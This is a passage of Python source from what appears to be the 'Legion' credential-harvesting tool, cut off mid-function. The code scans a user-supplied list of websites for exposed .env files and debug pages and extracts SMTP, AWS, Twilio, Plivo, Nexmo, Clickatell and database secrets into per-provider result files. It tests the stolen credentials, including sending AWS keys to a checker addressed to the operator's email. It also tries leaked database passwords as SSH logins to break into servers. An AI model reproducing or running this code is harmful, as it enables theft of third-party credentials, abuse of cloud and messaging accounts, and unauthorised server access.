                    host_field = r'<td>{}_HOST<\/td>\s+<td><pre.*>'.format(prefix)
                    host = self.clean_field(host_field, kwargs['text'], is_html=True)
                    port_field = r'<td>{}_PORT<\/td>\s+<td><pre.*>'.format(prefix)
                    port = self.clean_field(port_field, kwargs['text'], is_html=True)

                    user_field = r'<td>{}_USERNAME<\/td>\s+<td><pre.*>'.format(prefix)
                    user = self.clean_field(user_field, kwargs['text'], is_html=True)
                    pwd_field = r'<td>{}_PASSWORD<\/td>\s+<td><pre.*>'.format(prefix)
                    pwd = self.clean_field(pwd_field, kwargs['text'], is_html=True)

                    from_field = r'<td>{}_FROM_ADDRESS<\/td>\s+<td><pre.*>'.format(prefix)
                    from_addr = self.clean_field(from_field, kwargs['text'], is_html=True)
                    name_field = r'<td>{}_FROM_NAME<\/td>\s+<td><pre.*>'.format(prefix)
                    kwargs['from_name'] = self.clean_field(name_field, kwargs['text'], is_html=True)

                    enc_field = r'<td>{}_ENCRYPTION<\/td>\s+<td><pre.*>'.format(prefix)
                    kwargs['encrypt'] = self.clean_field(enc_field, kwargs['text'], is_html=True)

                    kwargs['domain'] = self.clean_field(r'<td>MAIL_DOMAIN</td>', kwargs['text'], is_html=True)
                    kwargs['app_url'] = self.clean_field(r'<td>APP_URL</td>', kwargs['text'], is_html=True)
                    return self.sort_smtp(host, port, user, pwd, from_addr, **kwargs)
            return False

    def clean_field(self, field, text, is_html=False):
        try:
            if is_html:
                return re.findall(r"{}(.*?)<\/span>".format(field), text)[0].strip("\"").strip("'").strip()
            text = text.replace("\n", "|").replace("\r\n", "|").replace("\t", "|")
            return re.findall(r"{}(.*?)\|".format(field), text)[0].strip("\"").strip("'").strip()
        except Exception as e:
            return ''

    def sort_smtp(self, host, port, user, pwd, from_addr, **kwargs):
        if host == "null" or port == "null" or user == "null" or pwd == "null":
            return
        if user.startswith("**") or host.startswith("**") or host.strip() == "":
            return
        else:
            if 'mailtrap.io' not in host:
                info = {'host': host, 'port': port, 'user': user, 'pwd': pwd, 'from_addr': from_addr}
                data = "{}|{}|{}|{}|{}|{}|{}\n".\
                format(kwargs['url'], host, port, user, pwd,\
                 from_addr, kwargs['from_name'])
                if "gmail.com" in host or "googlemail.com" in host:
                    self.save_result(data, self.gmail)
                elif ".office365.com" in host:
                    self.save_result(data, self.office)
                elif ".amazonaws.com" in host:
                    self.save_result(data, self.amazon)
                elif "ionos" in host:
                    self.save_result(data, self.ionos)
                elif "1and1" in host:
                    self.save_result(data, self.one_and_one)
                elif "sendgrid.net" in host:
                    self.save_result(data, self.sendgrid)
                elif "emailsrvr" in host:
                    self.save_result(data, self.rackspace)
                elif "mailgun" in host:
                    self.save_result(data, self.mailgun)
                elif "zoho" in host:
                    self.save_result(data, self.zoho)
                elif "mandrillapp" in host:
                    self.save_result(data, self.mandrillapp)
                elif "mailjet" in host:
                    self.save_result(data, self.mailjet)
                elif "sendinblue" in host:
                    self.save_result(data, self.sendinblue)
                else:
                    self.save_result(data, self.others)

                smtp_data = ("{}|{}|{}|{}\n").format( \
                    host, port, user, pwd)
                self.save_result(smtp_data, self.all_smtps)
                self.test_smtp(smtp_data, info)
                return True

    def do_http_or_https(self, url, use_post=False, shell_data=None):
        secured = False
        if 'https' in url:
            secured = True
        try:
            if use_post:
                if shell_data:
                    resp = requests.post(url, data=shell_data, verify=False,
                        headers=self.user_agent, allow_redirects=False, timeout=10)
                else:
                    resp = requests.post(url, data={"legion":"_tools"}, verify=False,
                        headers=self.user_agent, allow_redirects=False, timeout=10)

            else:
                if shell_data:
                    resp = requests.get(url, data=shell_data, headers=self.user_agent, verify=False,
                        allow_redirects=False, timeout=5)
                else:
                    resp = requests.get(url, headers=self.user_agent, verify=False,
                        allow_redirects=False, timeout=5)
            return resp.text, secured
        except requests.exceptions.ConnectionError as e:
            return -3, -3
        except Exception:
            pass
        return None, None

    def perform_request(self, url, path, use_post=False):
        if url.startswith('http://') or url.startswith('https://') or url.startswith("ftp://"):
            url = url.split('//')[1]
        secured = False
        if use_post:
            if self.protocol == 0 or self.protocol == 2:
                url_path = "http://{}".format(url)
                txt, sec = self.do_http_or_https(url_path, use_post=use_post)
                if txt == -3 and self.protocol == 2 or self.protocol == 0:
                    url_path = "https://{}".format(url)
                    txt, secured = self.do_http_or_https(url_path, use_post=use_post)
                    if txt == -3:
                        return -1, -1
                return txt, secured
            elif self.protocol == 1: #https only
                url_path = "https://{}".format(url)
                txt, secured = self.do_http_or_https(url_path, use_post=use_post)
                if txt == -3:
                    return -1, -1
                return txt, secured
        else:
            if self.protocol == 0 or self.protocol == 2: # 0=http or 2=http/https
                url_path = "http://{}{}".format(url, path)
                txt, secured = self.do_http_or_https(url_path)
                if txt == -3 and self.protocol == 2 or self.protocol == 0:
                    url_path = "https://{}{}".format(url, path)
                    txt, secured = self.do_http_or_https(url_path)
                    if txt == -3:
                        return -1, -1
                return txt, secured
            elif self.protocol == 1: #https only
                url_path = "https://{}{}".format(url, path)
                txt, secured = self.do_http_or_https(url_path)
                if txt == -3:
                    return -1, -1
                return txt, secured
        return None, None

    def get_aws(self, **kwargs):
        cracked = aws_key = aws_sec = aws_reg = aws_bucket = ''
        if "AWS_ACCESS_KEY_ID" in kwargs['text']:
            if "AWS_ACCESS_KEY_ID=" in kwargs['text']:
                aws_key = self.clean_field("AWS_ACCESS_KEY_ID=", kwargs['text'])
                aws_sec = self.clean_field("AWS_SECRET_ACCESS_KEY=", kwargs['text'])
                aws_reg = self.clean_field("AWS_DEFAULT_REGION=", kwargs['text'])
                if not aws_reg:
                    aws_reg = self.clean_field("AWS_REGION=", kwargs['text'])
                aws_bucket = self.clean_field("AWS_BUCKET=", kwargs['text'])

            elif "<td>AWS_ACCESS_KEY_ID</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>AWS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>AWS_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            elif "AWS_KEY" in kwargs['text']:
                if "AWS_KEY=" in kwargs['text']:
                    aws_key = self.clean_field("AWS_KEY=", kwargs['text'])
                    aws_sec = self.clean_field("AWS_SECRET=", kwargs['text'])
                    aws_reg = self.clean_field("AWS_DEFAULT_REGION=", kwargs['text'])
                    if not aws_reg:
                        aws_reg = self.clean_field("AWS_REGION=", kwargs['text'])
                    aws_bucket = self.clean_field("AWS_BUCKET=", kwargs['text'])

            elif "<td>AWS_KEY</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>AWS_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>AWS_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>AWS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>AWS_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            elif "AWS_SES_KEY" in kwargs['text']:
                if "AWS_SES_KEY=" in kwargs['text']:
                    aws_key = self.clean_field("AWS_SES_KEY=", kwargs['text'])
                    aws_sec = self.clean_field("AWS_SES_SECRET=", kwargs['text'])
                    aws_reg = self.clean_field("AWS_SES_REGION=", kwargs['text'])
                    if not aws_reg:
                        aws_reg = self.clean_field("AWS_REGION=", kwargs['text'])
                    aws_bucket = self.clean_field("AWS_BUCKET=", kwargs['text'])

            elif "<td>AWS_KEY</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>AWS_SES_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>AWS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>AWS_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            elif "AWS_SNS_KEY" in kwargs['text']:
                if "AWS_SNS_KEY=" in kwargs['text']:
                    aws_key = self.clean_field("AWS_SNS_KEY=", kwargs['text'])
                    aws_sec = self.clean_field("AWS_SNS_SECRET=", kwargs['text'])
                    aws_reg = self.clean_field("AWS_SNS_REGION=", kwargs['text'])
                    if not aws_reg:
                        aws_reg = self.clean_field("AWS_REGION=", kwargs['text'])
                    aws_bucket = self.clean_field("AWS_BUCKET=", kwargs['text'])

            elif "<td>AWS_SNS_KEY</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>AWS_SNS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>AWS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>AWS_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
            elif "AWS_S3_KEY" in kwargs['text']:
                if "AWS_S3_KEY=" in kwargs['text']:
                    aws_key = self.clean_field("AWS_S3_KEY=", kwargs['text'])
                    aws_sec = self.clean_field("AWS_S3_SECRET=", kwargs['text'])
                    aws_reg = self.clean_field("AWS_S3_REGION=", kwargs['text'])
                    if not aws_reg:
                        aws_reg = self.clean_field("AWS_REGION=", kwargs['text'])
                    aws_bucket = self.clean_field("AWS_BUCKET=", kwargs['text'])

            elif "<td>AWS_SNS_KEY</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>AWS_S3_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>AWS_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>AWS_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
            elif "SES_KEY" in kwargs['text']:
                if "SES_KEY=" in kwargs['text']:
                    aws_key = self.clean_field("SES_KEY=", kwargs['text'])
                    aws_sec = self.clean_field("SES_SECRET=", kwargs['text'])
                    aws_reg = self.clean_field("SES_DEFAULT_REGION=", kwargs['text'])
                    if not aws_reg:
                        aws_reg = self.clean_field("SES_REGION=", kwargs['text'])
                    aws_bucket = self.clean_field("SES_BUCKET=", kwargs['text'])

            elif "<td>SES_KEY</td>" in kwargs['text']:
                aws_key = self.clean_field("<td>SES_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_sec = self.clean_field("<td>SES_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_reg = self.clean_field("<td>SES_DEFAULT_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not aws_reg:
                    aws_reg = self.clean_field("<td>SES_REGION<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                aws_bucket = self.clean_field("<td>SES_BUCKET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
        aws_reg = aws_reg.replace("*", "")
        aws_sec = aws_sec.replace("*", "")
        if aws_key and aws_sec:
            if not aws_reg:
                for key in self.AWS_REGIONS:
                    if key in kwargs['text']:
                        aws_reg = key
                        break
            if aws_reg:
                it = f"{aws_key}:{aws_sec}:{aws_reg}"
                begin_check(it, to=self.to_email)

            cracked = "{}:{}:{}\n".format(aws_key, aws_sec, aws_reg)
            data = "{}|{}|{}\n".format(aws_key, aws_sec, aws_reg)
            self.save_result(data, self.amazon_keys)
            self.save_result(cracked, self.crack_aws)
            return True

    def get_twilio(self, **kwargs):
        tasid = takey = tasecret = tcs = tnum = ttoken = ''
        if "TWILIO" in kwargs['text']:
            if "TWILIO_ACCOUNT_SID=" in kwargs['text']:
                tasid = self.clean_field("TWILIO_ACCOUNT_SID=", kwargs['text'])
                takey = self.clean_field("TWILIO_API_KEY=", kwargs['text'])
                tasecret = self.clean_field("TWILIO_API_SECRET=", kwargs['text'])
                tcs = self.clean_field("TWILIO_CHAT_SERVICE_SID=", kwargs['text'])
                tnum = self.clean_field("TWILIO_NUMBER=", kwargs['text'])
                ttoken = self.clean_field("TWILIO_AUTH_TOKEN=", kwargs['text'])

            elif "<td>TWILIO_ACCOUNT_SID</td>" in kwargs['text']:
                tasid = self.clean_field("<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                takey = self.clean_field("<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                tasecret = self.clean_field("<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                tcs = self.clean_field("<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                tnum = self.clean_field("<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                ttoken = self.clean_field("<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
            if tasid and ttoken and tnum:
                data = ("{}|{}\n").format(tasid, ttoken)
                self.save_result(data, self.twilio)
                return True

    def get_plivo(self, **kwargs):
        auth_id = auth_token = auth_num = ''
        if "PLIVO" in kwargs['text']:
            if "PLIVO_AUTH_ID=" in kwargs['text']:
                auth_id = self.clean_field("PLIVO_AUTH_ID=", kwargs['text'])
                auth_token = self.clean_field("PLIVO_AUTH_TOKEN=", kwargs['text'])
                auth_num = self.clean_field("PLIVO_FROM_NUMBER=", kwargs['text'])

            elif "<td>PLIVO_AUTH_ID</td>" in kwargs['text']:
                auth_id = self.clean_field("<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                auth_token = self.clean_field("<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                auth_num = self.clean_field("<td>PLIVO_FROM_NUMBER<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                if not auth_num:
                    auth_num = self.clean_field("<td>PLIVO_NUMBER<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            if auth_id and auth_token:
                data = ("{}|{}|{}|{}|"
                "{}\n").format(kwargs['link'], kwargs['method'],
                auth_id, auth_token, auth_num)
                self.save_result(data, self.plivo)
                return True

    def get_nexmo(self, **kwargs):
        nex_key = nex_sec = ''
        if "NEXMO" in kwargs['text']:
            if "NEXMO_KEY=" in kwargs['text']:
                nex_key = self.clean_field("NEXMO_KEY=", kwargs['text'])
                nex_sec = self.clean_field("NEXMO_SECRET=", kwargs['text'])
            elif "<td>NEXMO_KEY</td>" in kwargs['text']:
                nex_key = self.clean_field("<td>NEXMO_KEY<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                nex_sec = self.clean_field("<td>NEXMO_SECRET<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            if nex_key and nex_sec:
                data = ("{}|{}|{}|{}\n")\
                .format(kwargs['link'], kwargs['method'], nex_key, nex_sec)
                self.save_result(data, self.nexmo)
                return True

    def get_clickatell(self, **kwargs):
        cuser = cpass = capi = ''
        if "CLICKATELL" in kwargs['text']:
            if "CLICKATELL_USER=" in kwargs['text']:
                cuser = self.clean_field("CLICKATELL_USER=", kwargs['text'])
                cpass = self.clean_field("CLICKATELL_PASS=", kwargs['text'])
                capi = self.clean_field("CLICKATELL_API_ID=", kwargs['text'])

            elif "<td>CLICKATELL_USER</td>" in kwargs['text']:
                cuser = self.clean_field("<td>CLICKATELL_USER<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                cpass = self.clean_field("<td>CLICKATELL_PASS<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                capi = self.clean_field("<td>CLICKATELL_API_ID<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            if cuser and cpass and capi:
                data = ("{}|{}|{}|{}|"
                "{}\n").format(kwargs['link'], kwargs['method'],
                cuser, cpass, capi)
                self.save_result(data, self.clickatell)
                return True

    def get_db(self, **kwargs):
        db_host = db_port = db_user = db_pass = ''
        if "DB_HOST" in kwargs['text']:
            if "DB_HOST=" in kwargs['text']:
                db_host = self.clean_field("DB_HOST=", kwargs['text'])
                db_port = self.clean_field("DB_PORT=", kwargs['text'])
                db_user = self.clean_field("DB_USERNAME=", kwargs['text'])
                db_pass = self.clean_field("DB_PASSWORD=", kwargs['text'])

            elif "<td>DB_HOST</td>" in kwargs['text']:
                db_host = self.clean_field("<td>DB_HOST<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                db_port = self.clean_field("<td>DB_PORT<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                db_user = self.clean_field("<td>DB_USERNAME<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)
                db_pass = self.clean_field("<td>DB_PASSWORD<\/td>\s+<td><pre.*>", kwargs['text'], is_html=True)

            if db_host and db_user and db_pass:
                data = ("{}|{}|{}|{}|{}|"
                "{}\n").format(kwargs['link'], kwargs['method'],
                db_host, db_port, db_user, db_pass)
                self.save_result(data, self.db_data)
                if self.crack_ssh(kwargs['url'], db_host, db_user, db_pass):
                    print(self.bty.green("[+] CONGRATULATIONS!!! VPS Cracked!"))
                return True

    def is_valid_ipv4_address(self, address):
        try:
            socket.inet_pton(socket.AF_INET, address)
        except AttributeError:
            try:
                socket.inet_aton(address)
            except socket.error:
                return False
            return address.count('.') == 3
        except socket.error:
            return False
        return True

    def crack_ssh(self, url, db_host, db_user, db_pass, ssh_port=22):
        if 'root' in db_user:
            try:
                server = None
                if '127.0.0.1' in db_host or '192.168.0.1' in db_host or 'localhost' in db_host:
                    server = url.strip('/').replace("http://", "").replace("https://", "")
                    server = socket.gethostbyname(server)
                if not server:
                    if self.is_valid_ipv4_address(db_host):
                        server = db_host
                    else:
                        server = url.strip('/').replace("http://", "").replace("https://", "")
                        server = socket.gethostbyname(server)
                if server:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(server, port=ssh_port, username=db_user, password=db_pass)
                    stdin, stdout, stderr = ssh.exec_command("echo 'wakanda';uname -a;")
                    lines = stdout.readlines()
                try:
                    data = "{}:{}:{}:{}:{}\n".format(server, db_user, db_pass, ssh_port, url)
                    if lines:
                        self.save_result(data, self.ssh)
                    else:
                        self.save_result(data, self.bad_ssh)
                    if lines:
                        return True

                except Exception as e:
                    pass
            except Exception as e:
                pass
        if db_user in db_user:
            try:
                server = None
                if '127.0.0.1' in db_host or '192.168.0.1' in db_host or 'localhost' in db_host:
                    server = url.strip('/').replace("http://", "").replace("https://", "")
                    server = socket.gethostbyname(server)
                if not server:
                    if self.is_valid_ipv4_address(db_host):
                        server = db_host
                    else:
                        server = url.strip('/').replace("http://", "").replace("https://", "")
                        server = socket.gethostbyname(server)
                if server:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(server, port=ssh_port, username=db_user, password=db_pass)
                    stdin, stdout, stderr = ssh.exec_command("echo 'wakanda';uname -a;")
                    lines = stdout.readlines()
                try:
                    data = "{}:{}:{}:{}:{}\n".format(server, db_user, db_pass, ssh_port, url)
                    if lines:
                        self.save_result(data, self.ssh)
                    else:
                        self.save_result(data, self.bad_ssh)
                    if lines:
                        return True

                except Exception as e:
                    pass
            except Exception as e:
                pass
        if '_' in db_user:
            aw, iw = db_user.split('_')
            try:
                server = None
                if '127.0.0.1' in db_host or '192.168.0.1' in db_host or 'localhost' in db_host:
                    server = url.strip('/').replace("http://", "").replace("https://", "")
                    server = socket.gethostbyname(server)
                if not server:
                    if self.is_valid_ipv4_address(db_host):
                        server = db_host
                    else:
                        server = url.strip('/').replace("http://", "").replace("https://", "")
                        server = socket.gethostbyname(server)
                if server:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(server, port=ssh_port, username=aw, password=db_pass)
                    stdin, stdout, stderr = ssh.exec_command("echo 'wakanda';uname -a;")
                    lines = stdout.readlines()
                try:
                    data = "{}:{}:{}:{}:{}\n".format(server, aw, db_pass, ssh_port, url)
                    if lines:
                        self.save_result(data, self.ssh)
                    else:
                        self.save_result(data, self.bad_ssh)
                    if lines:
                        return True

                except Exception as e:
                    pass
            except Exception as e:
                pass

def main(bty):
    while True:
        print(f'{red}└─╼ {res}[{gr}Give me your list{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        file_name = input()
        file_name = file_name.strip()
        if file_name:
            break
        else:
            print(f"{red}[{yl}Please enter valid file .txt file{red}]")
    try:
        if not file_name.endswith('.txt'):
            file_name = "{}.txt".format(file_name)
        with open(file_name) as ipf:
            lines = ipf.read().splitlines()
    except IOError:
        try:
            with open(file_name) as ipf:
                lines  = ipf.read().splitlines()
        except IOError:
            print(f"{red}[{yl}Unable to find file named {gr}{file_name}{red}]")
            print(f"{fc}Press Enter key to close and start over: {gr}",end='')
            _ = input()
            sys.exit()

    while True:
        try:
            print(f'{red}└─╼ {res}[{gr}Give me your Thread{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
            num_threads = int(input())
            if num_threads:
                break
        except Exception:
            print(f"{red}[{yl}Enter valid number only. {fc}Depending on ram size you can increase numbers{red}]")

    while True:
        try:
            print(f'{red}└─╼ {res}[{gr}Give me your Email{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
            email_addr = input()
            if re.match(r"^[A-Za-z0-9\.\+_-]+@[A-Za-z0-9\._-]+\.[a-zA-Z]*$", email_addr):
                break
        except Exception:
            print(f"{red}[{yl}Enter valid email for your result{red}]")

    while True:
        try:
            print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Scan Choice{mg}/{res}]\n{red}└─╼ {yl}[{gr}0 for http only{yl}]\n{red}└─╼ {yl}[{gr}1 for https only{yl}]\n{red}└─╼ {yl}[{gr}2 for http/https only{yl}]\n{red}└─╼ {res}~{gr}# {res}',end='')
            protocol = int(input())
            if protocol:
                break
        except Exception:
            print(bty.red("[!] Enter valid number between 0 and 2."))
    lock = Lock()
    queue = Queue()
    for x in range(num_threads):
        worker = ExploitEnv(email_addr, protocol, queue, lock)
        worker.daemon = True
        worker.start()

    print(f'{red}Total Sites/IP {gr}{len(lines)}')
    print(f'{red}Scanner start in {gr}3 {red}seconds')
    time.sleep(3)

    with open(file_name) as fh:
        for line in fh:
            queue.put(line.strip())
    queue.join()

#start Yi Debugger
class legion3:
	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break
	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID" in text:
					method = '/.env'
					try:
						aws_key = reg('AWS_ACCESS_KEY_ID.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET_ACCESS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg('AWS_ACCESS_KEY_ID.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET_ACCESS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY" in text:
					method = '/.env'
					try:
						aws_key = reg('AWS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg('AWS_BUCKET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg('AWS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg('AWS_BUCKET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SNS_KEY" in text:
				if "AWS_SNS_KEY" in text:
					method = '/.env'
					try:
					   aws_key = reg('AWS_SNS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SNS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg('AWS_SNS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SNS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_S3_KEY" in text:
				if "AWS_S3_KEY" in text:
					method = '/.env'
					try:
					   aws_key = reg('AWS_S3_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_S3_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_S3_KEY</td>" in text:
					method = 'debug'
					try:
